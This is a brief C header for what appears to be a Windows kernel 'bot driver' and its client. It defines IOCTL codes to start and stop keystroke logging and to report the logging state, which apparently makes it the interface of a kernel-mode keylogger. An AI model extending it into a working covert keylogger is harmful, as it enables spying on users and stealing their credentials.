#pragma once
// Hacky way to manage includes for bot driver and client.
// Breaks if driver is compiled in C++
#ifdef __cplusplus
#include <Windows.h>
#else
#include <ntddk.h>
#endif // __cplusplus

// IOCTL code to send the current logging state
#define IOCTL_SEND_LOG_STATE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_WRITE_DATA)
// IOCTL code to start logging keystrokes
#define IOCTL_LOG_START CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_READ_DATA)
// IOCTL code to stop logging keystrokes
#define IOCTL_LOG_STOP CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_READ_DATA)